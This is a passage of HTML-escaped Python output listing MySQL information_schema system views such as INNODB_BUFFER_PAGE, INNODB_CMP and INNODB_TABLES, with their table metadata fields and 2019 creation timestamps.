&#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;FILES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_BUFFER_PAGE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_BUFFER_PAGE_LRU&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_BUFFER_POOL_STATS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_CACHED_INDEXES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_CMP&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_CMPMEM&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_CMPMEM_RESET&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_CMP_PER_INDEX&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_CMP_PER_INDEX_RESET&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_CMP_RESET&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_COLUMNS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_DATAFILES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FIELDS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FOREIGN&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FOREIGN_COLS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FT_BEING_DELETED&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FT_CONFIG&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FT_DEFAULT_STOPWORD&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FT_DELETED&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FT_INDEX_CACHE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_FT_INDEX_TABLE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_INDEXES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_METRICS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_SESSION_TEMP_TABLESPACES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_TABLES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_TABLESPACES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_TABLESPACES_BRIEF&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: 